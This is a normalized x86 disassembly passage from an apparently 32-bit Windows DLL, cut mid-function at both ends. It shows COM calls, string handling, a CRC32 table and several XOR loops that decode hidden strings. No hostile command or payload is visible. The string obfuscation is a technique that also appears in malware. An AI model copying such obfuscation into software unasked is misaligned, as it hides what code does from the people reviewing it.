mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
movzx ecx [ ebp + 0x12 ]
movzx eax bx
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
sub_10052ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081d12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x134
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x140 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x138 ] eax
movsx eax [ ecx ]
xor eax 0xffe7
xor ecx ecx
and eax 0xff
mov [ ebp - 0x12c ] ax
mov [ ebp - 0x12a ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xff85
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_1005e3c0
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0x12c ]
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] edi
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] ax
mov edx [ ebp - 0x9c ]
push edx
call sub_10065045
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9b
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x24
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x13c ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x14 ] ax
call sub_10005160
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0xffea
and ecx 0xff
xor edx edx
mov [ ebp - 0x130 ] cx
mov [ ebp - 0x12e ] dx
movsx ecx [ eax ]
xor ecx 0xffb4
and ecx 0xff
add esp 0x8
xor eax eax
mov [ ebp - 0xc0 ] esi
mov esi [ ebp - 0x140 ]
mov [ ebp - 0xd4 ] ax
mov eax esi
mov [ ebp - 0x132 ] dx
mov [ ebp - 0x134 ] cx
mov [ ebp - 0xc4 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xd4 ]
call sub_1005e3c0
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x130 ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x5
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x134 ]
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x6
call sub_10045750
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000c1e0
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
xor eax eax
mov esi 0x7
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xb8 ]
cmp [ ebp - 0xa4 ] ebx
jae r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ ebp - 0x138 ]
push edx
call sub_100153b0
add esp 0x4
mov esi eax
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xb8 ]
push eax
call sub_10065045
add esp 0x4
sub_10053370
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_10078600
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_100533a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_10053695 ]
jmp [ eax * 4 + jump_table_10053639 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1005db57
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10009dbc
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_100536ce
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1007968d
add esp 0x14
pop ebp
retn
sub_10053700
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
dec eax
mov [ ecx + 0x4 ] eax
mov ecx [ ecx ]
mov eax [ ecx + eax * 4 ]
pop ebp
retn
pop ebp
retn
sub_10053720
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0x1c
call sub_1000a6f0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_1005cfc8
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_10078970
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x1c ]
push 0x2e
push esi
call sub_1005cfc8
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0x11c
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_10078600
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5c
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x20 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_1005cfc8
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100538b0
push esi
mov esi [ ebx ]
test esi esi
je r-xdata
xor eax eax
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
pop esi
retn
push edi
mov edi [ ebx + 0x4 ]
cmp esi edi
je r-xdata
mov eax [ ebx ]
push eax
call sub_10065045
add esp 0x4
pop edi
nop
call sub_10024d10
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_100538f0
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_10053917
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10024220
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_10053960
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x4c ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x68 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x6c ]
jne r-xdata
mov ecx [ esi + 0x64 ]
lea edx [ ebp + 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
lea eax [ esi + 0x64 ]
call sub_10019240
push edi
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x6c ]
jne r-xdata
add [ esi + 0x68 ] 0x4
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
lea eax [ esi + 0x64 ]
call sub_10019240
add [ esi + 0x68 ] 0x4
pop edi
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ esi + 0x64 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
sub_10053a10
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_100196f0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100172f0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10053a60
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push ebx
push esi
push edi
lea edi [ ebp - 0x50 ]
push edi
xor ebx ebx
mov esi edx
mov [ ebp - 0x50 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
mov [ ebp - 0x60 ] ebx
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x5c ]
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x5c ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x81
call sub_1000a6f0
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x60 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x12d
call sub_1000a6f0
lea edx [ ebp - 0x58 ]
mov [ ebp - 0x58 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x58 ]
push ecx
call sub_10035a60
mov edx [ ebp - 0x58 ]
push edx
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x10f
call sub_1000a6f0
mov [ ebp - 0x60 ] 0x3
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
sub_10053ba0
push ebp
mov ebp esp
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx 0x3
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0xc4 ] esi
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc0 ] eax
lea edx [ eax + 0x1 ]
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xffae
and ebx 0xff
mov [ ebp + eax * 2 - 0x4c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ebx [ ebp - 0x1c ]
mov ecx [ esi + 0x1c ]
xor eax eax
mov [ ebp - 0x3e ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xbc ]
push eax
push r--data
lea eax [ ebp - 0x4c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xbc ]
jns r-xdata
lea edx [ ebp - 0xac ]
xor esi esi
mov [ ebp - 0xac ] esi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp eax esi
jge r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ebx [ VarBstrFromUI4@IAT ]
lea ecx [ ebp - 0xb8 ]
push ecx
push esi
push 0x80000000
push eax
mov [ ebp - 0xb8 ] esi
call ebx
cmp [ ebp - 0xb8 ] esi
jne r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x12e
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x50
call sub_1000a6f0
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
mov eax 0x1f
call sub_1000a6f0
mov ecx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb8 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ecx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb8 ] eax
call sub_1000a6f0
mov edx [ ebp - 0xb8 ]
push edx
call [ SysFreeString@IAT ]
mov eax [ edi + 0x14 ]
lea ecx [ ebp - 0xb0 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb0 ] 0x0
call ebx
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0xe6
call sub_1000a6f0
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x30 ]
mov eax 0x28
call sub_1000a6f0
mov ebx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x3c ]
mov eax 0x10e
call sub_1000a6f0
mov esi [ edi + 0x4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x61
call sub_1000a6f0
mov eax [ edi + 0x8 ]
lea ecx [ ebp - 0xb4 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xb4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xce
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x60
call sub_1000a6f0
mov esi [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x1c ]
mov eax 0x120
call sub_1000a6f0
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x1b
call sub_1000a6f0
mov ecx [ ebp - 0xc8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xc0 ]
push ecx
mov ecx [ ebp - 0xbc ]
push ecx
push eax
call edx
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x101
jmp r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x8f
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xac ]
test eax eax
je r-xdata
sub_10053f20
push ebp
mov ebp esp
push esi
push edi
mov edi eax
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0x8 ] edi
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebx + edi * 4 ] ecx
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
pop edi
pop esi
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov [ ebx + edi * 4 ] eax
lea eax [ esi - 0x1 ]
cdq
sub eax edx
mov edi esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0x8 ] edi
jl r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebx + edi * 4 ] edx
pop edi
pop esi
pop ebp
retn
sub_10053f90
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
xor ecx ecx
test al 0x1
je r-xdata
xor eax 0xedb88320
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
mov eax ecx
shr eax 0x1
test cl 0x1
je r-xdata
or eax 0xffffffff
test edx edx
je r-xdata
mov [ ebp + ecx * 4 - 0x404 ] eax
inc ecx
cmp ecx 0x100
jl r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
not eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
movzx ecx [ esi ]
xor ecx eax
and ecx 0xff
shr eax 0x8
